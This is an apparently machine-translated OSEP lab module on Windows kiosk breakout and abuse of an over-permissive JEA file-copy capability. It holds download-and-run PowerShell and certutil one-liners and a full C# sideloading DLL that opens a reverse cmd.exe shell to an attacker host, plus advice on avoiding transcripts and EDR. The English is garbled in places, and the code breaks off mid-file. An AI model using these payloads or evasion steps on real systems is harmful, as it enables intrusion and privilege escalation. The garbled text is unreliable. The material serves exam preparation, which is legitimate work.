::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 14 · Scenarios 41–43: Kiosk breach · JEA unauthorized file copy · JIT time window

> Basis explanation: This topic has no direct entry in. The following content is based on the textbook chapter. 16 Chapter (restricted desktop / Kiosk breakthrough) and the 23 chapter（PowerShell restricted endpoint JEA with temporary authorization JIT）Organize experimental ideas and supplement general enumeration and verification methods。
> Writing convention: Chinese description + English commands; placeholders are unified as `LHOST` `LPORT` `TARGET` `DOMAIN` `USER` `PASS` `NTHASH` `PAYLOAD` `URL`。
> This module file：[14-kiosk-jea-jit](/modules/14-kiosk-jea-jit)、`m14-jea-file-copy.ps1`、`m14-jea-service-dll.cs`、`m14-jit-admin-window.ps1`、`m14-kiosk-breakout.md`。

## 0. Scene Overview

| scene | theme | Entrance → Target | main script |
|---|---|---|---|
| 41 | Kiosk breakthrough | Restricted single application desktop → Native command execution（kiosk user level） | `m14-kiosk-breakout.md` path list |
| 42 | JEA Over-wide file copy | restricted PowerShell endpoint (only Copy-Item Waiting for whitelist command）→ Service account code execution | `m14-jea-file-copy.ps1` + `m14-jea-service-dll.cs` |
| 43 | JIT time window | Temporary administrator authorization → Defined commands in the window + Use of remaining bills outside the window | `m14-jit-admin-window.ps1` |

Common premise: In-domain credentials have been obtained（`DOMAIN\USER` + `PASS` or `NTHASH`）and yes `TARGET` Network Reachability - Scenario 41 often RDP/physical session，42 need WinRM（5985/5986），43 need LDAP（389）or WinRM。

---

## Scenario 41 · Kiosk Breakout Path List

### Situation
The target machine is“single application Kiosk”Pattern operation：Windows The casing is replaced or replaced with Assigned Access Locked to a certain application (browser, self-developed program、PDF reader, etc.). We can interact with it (physical terminal or RDP），But the start menu、Win+R、Task manager, open directly cmd/PowerShell All are unavailable or removed by policy. Task: Find at least one path to get**command execution**。Breakthroughs usually fall first kiosk User identity (normal permissions), subsequent rights escalation/Follow the normal process laterally (see M06/M07）。

### Assumptions
- kiosk User is a normal domain/Local users, excluding administrator rights - expected to get low rights first after breaking through shell。
- Don't assume“All system channels are blocked”：a lot of kiosk Lock surface entry only (casing/Start menu), deep dialog channel (open/save as/Print/Help) often unblocked。
- RDP After entering if kiosk App crashes or can be closed（Alt+F4）And retreating to the desktop is equivalent to getting directly to the desktop - test the status of the shell first, don't rush to make holes。
- Need to be able to finally connect to the attack aircraft（`LHOST` right kiosk Reachable) or can bring out the command results。

### Prepare (attacker)
- Start monitoring：`nc -lvnp LPORT`，or C2 listener。
- Prepare for phase two `PAYLOAD`（PowerShell one line or executable file) and record the deliverable `URL`（HTTP/SMB）。
- Keep your route list handy for quick reference `m14-kiosk-breakout.md`，Check items one by one。
- If you leave RDP：Confirm clipboard/Is the local disk mapping available? (If available, delivery will be easier.）。

### Procedure
according to“Cost from low to high, first silent and then dynamic”Try each channel one by one and think about each item first.**Available signals**Do it again：

1. **Shell and application status**：Alt+Tab Are there any other windows?；Win key/Ctrl+Esc Whether to pop up the start menu；kiosk Application is closed（Alt+F4/Whether the taskbar falls to the desktop after closing)；Ctrl+Shift+Esc Whether to open the task manager。
2. **Browser / HTML Host**（kiosk The application is tried first when it is a browser）：
   - IE/old kernel（WebBrowser Controls are the same): address bar input `file:///C:/Windows/System32/cmd.exe` → Appear“Open/run”hint → Select Run to get cmd。
   - Chrome/Edge：document URL It will only trigger downloading and cannot be executed directly (this is the default in modern kernels). Go to the next chapter. 3、4 class dialog channel。
3. **Common file dialog escape**（kiosk Any within the app“Open/save as/import/Export/Attached files”Button): Modern Open/The Save As dialog box has its own address bar and file name box - address bar input `C:\Windows\System32` After pressing Enter to enter the directory, enter it in the address bar. `cmd.exe` Enter（Explorer The system dialog box will execute PATH Internal program name; if not recognized, enter the full path）。**This is the most common and often missed channel。**
4. **Print/Export dialog**：any“print to PDF / Save as PDF / Export report”Each entry has a file dialog box, the same as Chapter 1 3 multiplexing。
5. **Help system**：application“help”If .chm Open（hh.exe window），CHM Inside“Jump URL/shortcut”Can point to external programs; if the help is opened in the browser → Back to Chapter 2 strip。
6. **Accessibility / input method**：Win+U Play when available“Easy to use”，its link (narrator/On-screen keyboard) can sometimes bring up the system interface; on-screen keyboard often Win key virtual key。
7. **task manager channel**：Ctrl+Shift+Esc → document → Run new task → enter `cmd`。Ruo Dan UAC It means that this operation is requesting privilege escalation and changing user-level channels (Task Manager“Run new task”It is not always possible to escalate privileges for the current user. It is worth trying.）。
8. **Immediately solidify the scene after receiving the order and executing it**：Write the channel and reproduction steps into the list, then pop back shell（See verification) to avoid repeated entry and exit。

### Scripts used
- `m14-kiosk-breakout.md`：A quick check of the route list by channel, including each“Available signals / Blocked features / Remark”，Used to check items one by one on site。

### Validation
- Backlink occurs：`nc -lvnp LPORT` A connection is received; or the command echo is visible。
- exist shell Confirm identity and network here：`whoami`（should be kiosk user）、`ipconfig`、`netstat -ano`、`cmdkey /list`、`dir %APPDATA%\Microsoft\Credentials`。
- If you just get it“In-dialog file system access”rather than complete shell，The verification standard is“Can it be reproduced stably without interruption? kiosk business”。
- Record integrity level：`whoami /groups | findstr /i "Mandatory Integrity"`——Determine whether the next step is to escalate privileges or directly go horizontally。

### Failure branches and alternatives
- **Open/All save as dialog boxes are blocked by policy**：Trial print dialog box, error dialog box (triggered intentionally kiosk Application error reporting, often with“View log/Details/open location”class link); or on-screen keyboard/touch keyboard Win key。
- **The browser only downloads but does not execute**：After downloading use 3 The dialog box channel locates the download directory and then executes it; or delivers `.hta`/`.lnk` Wait for the file to be opened by the system handler, and then look for the dialog box from the handler/Jump channel。
- **All user-level channels are blocked**：Return to the system level entry - if physical access is available, consider the boot sequence/Firmware (beyond the scope of common exams）；RDP kiosk Can be disconnected and reconnected to observe the pre-login interface (auxiliary function entrance sethc/utilman This is a pre-login scenario and requires the system disk to be writable. See M06 Ideas）。

### Exam / OPSEC notes
- per channel**Just try it once**：Trial and error will result in shell/EDR Leaves a lot of suspicious interactions; try silent dialog classes first (no process behavior），shell Try not to fall off the market before rebounding。
- bomb cmd The window may flash by: combine the two phases into one command（`cmd /c powershell -nop -w hidden -enc <PAYLOAD>`）Reduce window dwell time。
- Prioritize memory channels after breakthrough（PowerShell reflection / Add-Type memory loading), do not kiosk writable directory exe。
- Keep a record of ticking off the checklist: hand in the report to make it clear“Which channels are open, which ones are blocked, and steps to reproduce”。

---

#### `m14-kiosk-breakout.md` {#m14-kiosk-breakout-md}

````markdown
# Kiosk Breakout Path Checklist (Scenario 41)

> Usage: restricted Kiosk Desktop (single app / Assigned Access / Under Replace Shell), check each item"Can I get the order to execute?"channel list，
> And how to stabilize the situation after obtaining the execution opportunity payload。
> scene：41（only restricted Kiosk Desktop, no terminal）
> Dependencies: physical terminal or RDP Interaction; the attack machine side has started monitoring（`nc -lvnp LPORT`）And prepare for the second stage `PAYLOAD` For delivery `URL`
> Use: press on site"Cost from low to high, first silent and then dynamic"Test item by item, each item**Just try it once**，Check the result §5 In the list (the report must clearly indicate which ones are accessible and which ones are blocked)）
> placeholder：`LHOST`（attack aircraft IP）、`LPORT`（listening port）、`TARGET`（target machine）、`USER`（kiosk Account）、`URL`（Delivery address）、`PAYLOAD`（Payload file name）
> Test status: Operation notes, no executable code; all commands need to be checked against the actual version in the experimental environment (especially the browser kernel and Edge/Chrome Strategy）

---

## 1. Confirm the restricted form first (don’t rush to drill holes)

| Things to confirm | How to confirm | How to use conclusion |
|---|---|---|
| yes"Single Application Kiosk"still"restricted shell" | Win key / Ctrl+Esc / Ctrl+Alt+Del / Alt+F4 | Alt+F4 turn off kiosk Applications can be dropped to the desktop = Take it directly to the desktop, no need to drill holes later |
| Are there any other windows? | Alt+Tab、task bar | There is residue Explorer/dialog box = Find it first"open/save as" |
| Is task manager available? | Ctrl+Shift+Esc | Available → Walk §2.7（document → Run new task） |
| Is there a file dialog box | In-app"Open/Save As/Import/Export/Attach File/Print"button | have → §2.2 Is the most common and most commonly missed channel |
| Is there a writable location? | User directory、`%TEMP%`、Browser download directory | Decide whether to place the order; if not, use the pure memory channel |

---

## 2. Channel list

### 2.1 Browser address bar `file://` (kiosk application is tried first when the browser is used)

| Kernel | operate | Available signals | Blocked features |
|---|---|---|---|
| IE / WebBrowser Control (same as kernel） | Address bar input `file:///C:/Windows/System32/cmd.exe` → pop up"open/save"hint → select**run** | pop up directly cmd window | The tooltip is disabled by policy / Just let save |
| Chrome / Edge（modern kernel） | Same as above | **It will only trigger the download, but not execute it.**（Default behavior） | Download completed → change §2.2 Use the file dialog box to navigate to the download directory and then execute it. |
| any kernel | `file:///C:/Windows/System32/` Browse catalog | Able to list = Have at least file system browsing rights | hint"Unable to access" = document URL blocked |

> Alternate entrance：`about:` Links on the page, developer tools（F12，If not banned）、"Print"entrance (see §2.4）。

### 2.2 Common file dialog box (Open/Save As/Import/Export/Attach File)

**The most common and often missed channels. ** The modern open/save dialog box has its own address bar and file name box:

```text
1) Click on any"Open/Save As/Import/Export/Attach File"button
2) Address bar input  C:\Windows\System32   Enter   → Enter this directory
3) Address bar input  cmd.exe                Enter   → Explorer The system dialog box will execute PATH Internal program name
   （If the program name is not recognized, enter the full path. C:\Windows\System32\cmd.exe）
4) Or enter the file name box \\LHOST\share\PAYLOAD Direct execution SMB files on the network (out of the network/When the share is reachable）
```

| Available signals | Blocked features | Remark |
|---|---|---|
| The address bar is editable and jumps successfully | Address bar read only / You can only click on the directory tree | The directory tree can also be walked System32，Then enter in the file name box `cmd.exe` |
| Pop up after carriage return cmd window | Double-click the file to be"Open method"strategic block | Change `.bat`/`.cmd`/`.exe` Try them all once；`.lnk` Also available |

### 2.3 Help → View (Help menu / hh.exe / .chm)

```text
1) application"help"menu → If .chm Open（hh.exe window）：
   - CHM Inside"Jump to URL / shortcut"Can point to external programs
   - hh.exe Right click in the window → View source / Print → will bring up the file dialog box (return to §2.2）
2) If help opens in browser → return to §2.1/§2.2
3) help window"Options → View/Open"button also drops into the file dialog box
```

| Available signals | Blocked features | Remark |
|---|---|---|
| .chm The window appears and can be right-clicked | Help menu is grayed out / An error is reported when opening | The error dialog box itself is also a channel (see §2.8） |

### 2.4 Print/Export Dialog (Print to PDF/Save PDF As/Export Report)

```text
1) arbitrary"Print"Entrance（Ctrl+P）→ choose"Save as PDF"/"Print to PDF"/"Export"
2) pop up"save as"dialog box = Standard file dialog → Completely reusable §2.2 practices
3) Often in the print preview window"Open/Save/Find"Button, also with dialog box
```

| Available signals | Blocked features | Remark |
|---|---|---|
| Appear"Save as PDF"file dialog | No printing permission / Printer driver removed | try out"Export to XPS/CSV/Image"Wait for other export entrances |

### 2.5 Installed applications (programs in the whitelist)

| application | Breakthrough | fall to the action of execution |
|---|---|---|
| Notepad（Notepad） | document → **Open** / **save as** → path bar | Path field `C:\Windows\System32`，File name box input `cmd.exe` Enter |
| Notepad | help → about/Feedback link (some versions include http Link） | Link opens in browser → return §2.1 |
| WordPad | document → Open →"Insert object"/file dialog | same §2.2；The inserted object can point to the executable file |
| mspaint（Draw a picture） | document → Open / save as | same §2.2 |
| calc（calculator） | help → about → Link (old version）/ Navigation menu | old version"about"inside http The link can activate the browser; the new version is basically unsolvable, so use other applications. |
| PDF reader | open file / Save a copy / Print / appendix | All three places have file dialog boxes |
| Browser | Download catalog + File dialog; download items"show in folder" | After displaying Explorer window → Enter the address bar `cmd.exe` |
| file is linked to Office Viewer | Open → Macro/objects (majority kiosk Macros banned） | If macros are disabled, just use the file dialog |
| cmd / PowerShell allowed | It’s already a terminal, no need to break through | Direct execution §3 |

### 2.6 Accessibility/Input Method

| operate | Available signals | Remark |
|---|---|---|
| Win+U（Ease of use center） | Pop-up panel with Narrator/On-screen keyboard link | Narrator window sometimes has"Open"Entrance |
| On-screen keyboard（osk） | On the keyboard there is Win key virtual key | Can try Win+R / Win+E；a lot of kiosk Only lock the outer shell, not here |
| touch keyboard / Input method bar | Can bring up the input method settings window | Settings window always appears"Open location/browse"button |

### 2.7 Task Manager

```text
Ctrl+Shift+Esc → document → Run new task → enter cmd（or powershell）
```

| Available signals | Blocked features | Remark |
|---|---|---|
| "Run new task"Available and starting from the current user cmd | bomb UAC Description is requesting privilege escalation → Change user level channel | This will only be considered when all user-level channels are blocked. UAC route (see M06） |

### 2.8 Error dialog box (triggered on purpose)

deliberately let kiosk Application errors (malformed input, oversized files, disconnection operations), error boxes often appear"View Log/Details/Open Location/Export Diagnostics"，
These buttons ultimately fall into the file dialog box or Explorer window。

---

## 3. After getting the execution opportunity: solidify the opportunity into a stable shell

**Principle: Silence (memory) first and then load the disk; the commands are pre-assembled, and the window can be completed in a flash. **

```bat
:: ① One command takes shape（cmd It doesn’t matter if it passes by in a flash, reduce the window dwell time）
cmd /c powershell -nop -w hidden -enc <PAYLOADofBase64>

:: ② Download and execute in memory (without dropping to disk)，kiosk Writable directories are not placed exe）
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('URL/s.ps1')"

:: ③ When it is necessary to download the disk, use the system's own downloader, which takes priority. %TEMP%
certutil -urlcache -split -f URL/PAYLOAD %TEMP%\PAYLOAD && %TEMP%\PAYLOAD

:: ④ Immediately confirm your identity and network after reconnecting (decide whether the next step is to escalate privileges or directly go horizontally)）
whoami & hostname & ipconfig & netstat -ano & cmdkey /list
whoami /groups | findstr /i "Mandatory"      :: Look at the integrity level：Medium=Need to elevate rights，High=promoted
dir %APPDATA%\Microsoft\Credentials
```

> `PAYLOAD` Fill in when generating `LHOST`/`LPORT`；Attack aircraft maintain `nc -lvnp LPORT` Normally open。
> kiosk Scenarios that will be restored every time you restart: Don’t rely on persistence, complete it once in the current session。

---

## 4. Failed branch

1. **Open/All save as dialog boxes are blocked by policy** → print dialog（§2.4）、error dialog（§2.8）、On-screen keyboard Win key（§2.6）。
2. **The browser only downloads but does not execute** → Download and use §2.2 Navigate to the download directory for execution; or post the file opened by the system handler（`.hta`/`.lnk`/`.chm`），
   Then look for the dialog box from the handler/Jump channel。
3. **All user-level channels are blocked** → System-level entry (boot sequence when physically exposed/Firmware, beyond the scope of common exams）；
   RDP kiosk You can disconnect and reconnect, and observe the pre-login interface (the auxiliary function entrance belongs to the pre-login scene, and the system disk must be writable, see M06）。
4. **Writing the startup directory is ACL reject** → Change `%TEMP%`/User directory; if you can create a scheduled task, just trigger the scheduled task。
5. **Kiosk Restore every reboot** → Give up persistence and complete all actions within the current session。

---

## 5. On-site check list

```text
[ ] Alt+F4 / Whether to close the application and drop it to the desktop        [ ] Win key / Ctrl+Esc Whether to pop up the start menu
[ ] Ctrl+Shift+Esc task manager            [ ] document → Run new task → cmd
[ ] Browser address bar file:///C:/Windows/System32/cmd.exe    [ ] Open dialog address bar → cmd.exe
[ ] Save as dialog box → cmd.exe               [ ] Print/Export PDF → Save as dialog box
[ ] help → Check / hh.exe / .chm          [ ] Installed app：Notepad / WordPad / mspaint / calc / PDF
[ ] Win+U Easy to use / On-screen keyboard Win key      [ ] Deliberately triggering an error → View log/open location
[ ] The execution opportunity has been solidified (reconnection successful) / The command echo is visible）
[ ] Records: open channels, blocked channels, recurrence steps (reports should be written）
```

---

## 6. OPSEC reminder

- per channel**Just try it once**：Trial and error will result in shell/EDR Leaves a lot of suspicious interactions; try dialog classes with no process behavior first。
- Try not to fall into the market before the rebound; give priority to the memory channel after the breakthrough（PowerShell reflection / `Add-Type` memory loading）。
- Kiosk Always use screen recording/For monitoring, the operation must be fast, and the commands must be written in advance and pasted and executed at once.。
- Keep a check-box record: make it clear in the report"Which channels are open, which ones are blocked, and how to reproduce them?"。
````

## Scenario 42 · JEA over-wide file copy + service loading trigger

### Situation
Exists in domain PowerShell restricted endpoint（JEA，Use when logging in `-ConfigurationName` Specify session configuration, such as `BackupMaintenance`）。The low-privilege account we control is a JEA Members of a role, abilities of that role（Role Capability）**too wide**：allow `Copy-Item` and `-Destination` Not restricted to security directories (can write to service directories, etc.), or additionally allowed access to specified services `Restart-Service`。The capability whitelist does not include any command execution, so it cannot be directly JEA Run code in session. Attack idea: use file copy to remove malicious DLL put in**Serve/The daemon will be loaded from this directory DLL**location (within the directory“Missing dependencies DLL”or plugin DLL），Trigger the load again and let the code execute in the context of the service account。

### Assumptions
- Know JEA The endpoint name, and our account has endpoint permissions（Permission）Allowed members (available `Get-PSSessionConfiguration` or from memory/Social worker gets endpoint name）。
- exist“Directories can be copied and writable by files + The service will be loaded from this directory DLL”Target: The most common is the installation directory of a third-party service（DLL Search for sequential sideloading) or service plugins/module directory。
- There is at least one triggering method: the role allows `Restart-Service`/`Stop-Service`+`Start-Service`；Or the service will automatically restart periodically; or the administrator will restart the service manually.。
- JEA Session with virtual account/The hosting service account is running, and the disk placement is subject to the permissions of the account - it is possible to write to the service directory without permission.“Too much ability”manifestation。

### Prepare (attacker)
- Prepare to be malicious DLL：`m14-jea-service-dll.cs`（Or use it instead according to the missing dependency type of the target. M04 of C Native DLL template）。
- Start monitoring：`nc -lvnp LPORT`；confirm `LHOST` right `TARGET` of 5985/5986 Reachable。
- Try to understand the target service first exe The actual missing dependency name and architecture（x64/x86）——side loading DLL of**Filename and architecture must match host**。

### Procedure
1. **Discovery endpoint**（from other machines/When credentials are enumerated）：
   `Get-PSSessionConfiguration | Select-Object Name, Permission`
2. **Construct credentials and connect JEA endpoint**：
   `$cred = Get-Credential DOMAIN\USER`；`Enter-PSSession -ComputerName TARGET -ConfigurationName <JEA-endpoint> -Credential $cred`
   （NTHASH When there is no clear text，WinRM Direct connection does not support hashing, use instead `m15` of evil-winrm/PowerShell Hash login template; or first put NTHASH Exchange tickets。）
3. **Enumerate available commands within a session**：`Get-Command | Select-Object Name, Source`——JEA Unallowed commands will be hidden，**What you can see is what you can use**。confirm `Copy-Item` in the column；`Restart-Service`/`Test-Path` Whether to be listed determines the triggering and verification strategies。
4. **Exploring boundaries (harmless files）**：`Copy-Item C:\Windows\Temp\probe.txt -Destination <candidate-dir>\m14probe.txt`。success/The error message is used to determine whether the directory is within the replication capability (report Access Denied/Path is excluded → Change directory）。
5. **Identify target services and DLL name**：If you can list services（`Get-Service` If it is in the whitelist, list it directly); otherwise, it will be judged based on the known software of the target machine. Main points：**The name of the delivery file must be a dependency that is missing from the host or the name of a plug-in that will be loaded.**，Architecture matching。
6. **throw malicious DLL**：`Copy-Item \\LHOST\share\evil.dll -Destination "<service-dir>\<missing-dep-name>.dll" -Force`（First put the original DLL The backup copy is kept on the attacking machine side to facilitate subsequent recovery.）。
7. **trigger loading**：
   - role allowed：`Restart-Service <service-name>`（First `Stop-Service` Again `Start-Service` Give it a try. If you have the ability, you can only release one of them.）。
   - Service control not allowed: Wait for the service to automatically restart/Administrator operation, monitoring remains online, persistence is prepared in advance。
8. **Recycling and Cleanup**：shell After connecting back `whoami` Should be a service account; check the monitoring log and DLL Restore overwritten files on demand after behavior。

### Scripts used
- `m14-jea-file-copy.ps1`：Automated Section from Attack Aircraft 2、4、6、7 Step (Construct Credentials → Enter JEA session → enumeration command → Harmless exploration of boundaries → Place → trigger), output the result at each step。
- `m14-jea-service-dll.cs`：was placed DLL Load template (load and connect back/Two modes for executing commands, including compilation route instructions）。

### Validation
- within session `Get-Command` can see `Copy-Item` Waiting for whitelist command → Endpoints are reachable and capabilities are in line with expectations。
- The pathfinding file is indeed written to the target directory (if allowed within the session `Test-Path` Check directly; otherwise, use the second step Copy-Item Overwrite the file with the same name to see if it reports“Already exists/occupied”indirect judgment）。
- After triggering, the listener receives the connection back，`whoami` for service account → End-to-end success。

### Failure branches and alternatives
- **`-Destination` actually restricted**（Report an error/Excluded): Trying to read character ability file location allowed path——`C:\Program Files\WindowsPowerShell\Modules\<module>\<role-capability>\*.psrc` of `FileSystem` paragraph (if it can be read); or resubmit“shared root directory + The target service treats the share as a module/Configuration directory loading”combination。
- **The service is not loaded and put in DLL**（Guess the name or dependency incorrectly): Use it on the attack machine first dumpbin/ProcMon Idea confirmation service exe Which import table is missing? DLL；none ProcMon Check for software of the same version“Known to be sideloadable DLL name”List (such as `version.dll`、`winmm.dll` kind）。
- **There are no service control commands and the service will not restart automatically.**：File copy capability can change trigger objects - login scripts and scheduled task scripts that overwrite writable locations、`Startup` Shortcuts, configuration files that are executed periodically,“Service trigger”Change to“event trigger”（User login/Scheduled tasks）。
- **The service context is NetworkService/LocalService rather than SYSTEM**：Accept this context to do horizontal, or change it to SYSTEM Running service target。

### Exam / OPSEC notes
- JEA Endpoints are usually mandatory **Transcript**，All commands within the session will be recorded: sensitive actions should be included as much as possible DLL internal finish，JEA Only keep in the conversation `Copy-Item`/`Restart-Service` This type“fit the role”Operation。
- Pathfinding uses harmless files and file names close to business habits; formal DLL Naming the dependencies that are missing from the host can greatly reduce suspicion.。
- Triggering service restart may cause business interruption: Prioritize non-critical options/Copy service; record the original status of the service before triggering, and restore it at the end。
- DLL The return address in `LHOST` before launch**Confirm last time**——Once released, it cannot be modified.。

---

#### `m14-jea-service-dll.cs` {#m14-jea-service-dll-cs}

````csharp
// Purpose: Service DLL payload of JEA scenario - executed when loaded by high-privilege context (service account/SYSTEM/InstallUtil host),
// The action is "Write with higher permissions to a location that a low-privileged account cannot write to" (verify that the unauthorized write is successful), and you can optionally connect back to LHOST:LPORT.
// Scenario: 42 (JEA session exposes only a few commands, including over-privileged file copying)
// Depends: .NET Framework 3.5+/4.x (csc.exe comes in C:\Windows\Microsoft.NET\Framework64\v4.0.30319)
// Compile:
// # ① InstallUtil trigger route (no native export required, most stable)
//   csc.exe /target:library /out:m14-jea-service-dll.dll m14-jea-service-dll.cs /r:System.Configuration.Install.dll /r:System.ServiceProcess.dll
// # ② Native export (side loading) route: DllExport tool chain (3F/DllExport or UnmanagedExports) is required followed by -define:USE_DLLEXPORT
//   csc.exe /target:library /define:USE_DLLEXPORT /out:version.dll m14-jea-service-dll.cs /r:System.Configuration.Install.dll /r:System.ServiceProcess.dll
// # ③ 32-bit host must use 32-bit csc: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe (x64 service cannot load x86 DLL)
// Usage: 
// # InstallUtil trigger (if Restart-Service is allowed in the JEA session, the target service can also be triggered by restarting it)
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U m14-jea-service-dll.dll
// # Side-loading trigger: DLL named as the host’s missing dependency name (such as version.dll) is placed in the service directory and restarts the service.
//   copy m14-jea-service-dll.dll "C:\Program Files\TargetSvc\version.dll" /Y
//   sc stop TargetSvc && sc start TargetSvc
// Placeholders: LHOST=attack machine IP, LPORT=listening port (reconnection mode; automatically skip reconnection when not replaced and only do mark writing)
// Test status: Not compiled on this machine (no csc); the code is written according to .NET Framework 4.x API and needs to be compiled and verified in the experimental environment
//
// Export name and calling convention (which determines the success or failure of sideloading, be sure to check it word for word):
// 1. The file name must be exactly the same as the DLL that the host is looking for (the missing dependency seen by ldd/dumpbin/imports or ProcMon,
// Common sideloadable names: version.dll, winmm.dll, winhttp.dll, dbghelp.dll, profapi.dll).
// 2. The exported function name, number and order of parameters, and return value must be consistent with the original DLL; this file provides six exports of version.dll.
// 3. Calling convention: x86 uses StdCall ([UnmanagedFunctionPtr(CallingConvention.StdCall)]), and all conventions under x64 are equivalent.
// But the attribute is still written as StdCall for consistency; the name modification (_GetFileVersionInfoW@16) is handled by the DllExport tool,
// After generation, use dumpbin /exports version.dll to check that there are no redundant prefixes/suffixes in the export name.
// 4. Do not export DllMain: The DllMain of a managed DLL is taken over by the CLR, and manual export is prone to deadlock loader locks.
// Use module initialization when "load and execute" is required (the static constructor of this file has triggered the Payload when the export is first called).
// 5. The architecture must match the host: x64 service will directly report BadImageFormatException when loading x86 DLL.

using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;

#if !USE_DLLEXPORT
// When using the DllExport toolchain (-define:USE_DLLEXPORT above), this feature is provided by the tool and this section is skipped.
// When not using the tool chain (only taking the InstallUtil/hosted service route), the placeholder feature with the same name is given here to ensure that the file can be compiled directly with csc.
[AttributeUsage(AttributeTargets.Method, AllowMultiple = false)]
public sealed class DllExportAttribute : Attribute
{
    public DllExportAttribute() { }
    public DllExportAttribute(string exportName) { ExportName = exportName; }
    public string ExportName { get; set; }
    public CallingConvention CallingConvention { get; set; }
}
#endif

namespace M14Jea
{
    // Payload ontology: All trigger routes (InstallUtil/Service/Native Export) eventually call Payload.Run()
    public static class Payload
    {
        // High-privilege write target: Ordinary domain users cannot write in. If they can write successfully, it means that "writing without privileges + code running under a service account" is true.
        private const string MarkerPath = @"C:\Program Files\Common Files\m14-jea.marker";

        // Backlink target (placeholder, replaced before delivery; automatically skips backlink if not replaced)
        private const string LHOST = "LHOST";
        private const int LPORT = 4444;

        private static int _done = 0;

        public static void Run()
        {
            // Run only once: The host may call the exported function multiple times/load it multiple times
            if (Interlocked.Exchange(ref _done, 1) == 1) return;

            try { WriteMarker(); }
            catch (Exception ex) { TryLog("marker failed: " + ex.Message); }

            try { if (!LHOST.Contains("LHOST")) ReverseShell(LHOST, LPORT); }
            catch (Exception ex) { TryLog("rev failed: " + ex.Message); }
        }

        // Action ①: Write the file with higher permissions - this is the "task body" of this DLL and the best step to verify
        private static void WriteMarker()
        {
            string who;
            try { who = WindowsIdentity.GetCurrent().Name; }
            catch { who = Environment.UserName; }

            string body = "m14-jea-service-dll marker\n"
                        + "time : " + DateTime.Now.ToString("o") + "\n"
                        + "who  : " + who + "\n"
                        + "proc : " + Process.GetCurrentProcess().ProcessName + "\n"
                        + "path : " + MarkerPath + "\n";

            string dir = Path.GetDirectoryName(MarkerPath);
            if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
            {
                // Create the directory even if it does not exist: this step itself requires high permissions
                Directory.CreateDirectory(dir);
            }
            File.WriteAllText(MarkerPath, body, Encoding.UTF8);
        }

        // Action ②: Optional backlink (need to replace LHOST/LPORT with real values ​​first)
        private static void ReverseShell(string host, int port)
        {
            TcpClient client = new TcpClient();
            client.Connect(host, port);
            NetworkStream ns = client.GetStream();

            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();

            Thread t1 = new Thread(() => { try { p.StandardInput.BaseStream.CopyTo(ns); } catch { } });
            Thread t2 = new Thread(() => { try { ns.CopyTo(p.StandardInput.BaseStream); } catch { } });
            t1.IsBackground = true; t2.IsBackground = true;
            t1.Start(); t2.Start();

            p.WaitForExit();
            try { client.Close(); } catch { }
        }

        // Do not throw any exceptions: if the service fails to start, event logs will be written, which will make it more exposed.
        private static void TryLog(string msg)
        {
            try
            {
                File.AppendAllText(Path.Combine(Path.GetTempPath(), "m14-jea-err.txt"),
                                   DateTime.Now.ToString("o") + " " + msg + Environment.NewLine);
            }
            catch { }
        }
    }

    // Route ①: InstallUtil host (InstallUtil.exe /U m14-jea-service-dll.dll triggers Uninstall, Install is the same)
    [RunInstaller(true)]
    public class JeaInstaller : Installer
    {
        public override void Install(System.Collections.IDictionary stateSaver)
        {
            Payload.Run();
            base.Install(stateSaver);
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Payload.Run();
            base.Uninstall(savedState);
        }
    }

    // Route ②: Managed service (if the target service is a .NET service, you can put it into the service directory as a plug-in/dependent DLL and restart the service)
    public class JeaService : ServiceBase
    {
        public JeaService() { ServiceName = "M14JeaSvc"; }

        protected override void OnStart(string[] args)
        {
            // Must return immediately, otherwise SCM reports "Service startup timeout" (1053) - the load is placed in the background thread
            Thread t = new Thread(new ThreadStart(Payload.Run));
            t.IsBackground = true;
            t.Start();
        }

        protected override void OnStop() { }
    }

    // Route ③: Native export (side loading). Taking version.dll as an example, the export name/signature/calling convention copies the real Windows API.
    public static class Exports
    {
        private const string RealDll = @"C:\Windows\System32\version.dll";

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate bool GetFileVersionInfoWDelegate(string filename, int handle, int len, byte[] data);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        private delegate bool GetFileVersionInfoADelegate(string filename, int handle, int len, byte[] data);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int GetFileVersionInfoSizeWDelegate(string filename, out int handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        private delegate int GetFileVersionInfoSizeADelegate(string filename, out int handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate bool VerQueryValueWDelegate(byte[] block, string subBlock, out IntPtr buffer, out uint len);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        private delegate bool VerQueryValueADelegate(byte[] block, string subBlock, out IntPtr buffer, out uint len);

        // Forwarding: Get the original function from the real version.dll of System32 to ensure that the host business is not affected (no crash)
        private static T Resolve<T>(string exportName) where T : class
        {
            IntPtr h = LoadLibrary(RealDll);
            if (h == IntPtr.Zero) return null;
            IntPtr fn = GetProcAddress(h, exportName);
            if (fn == IntPtr.Zero) return null;
            return Marshal.GetDelegateForFunctionPointer(fn, typeof(T)) as T;
        }

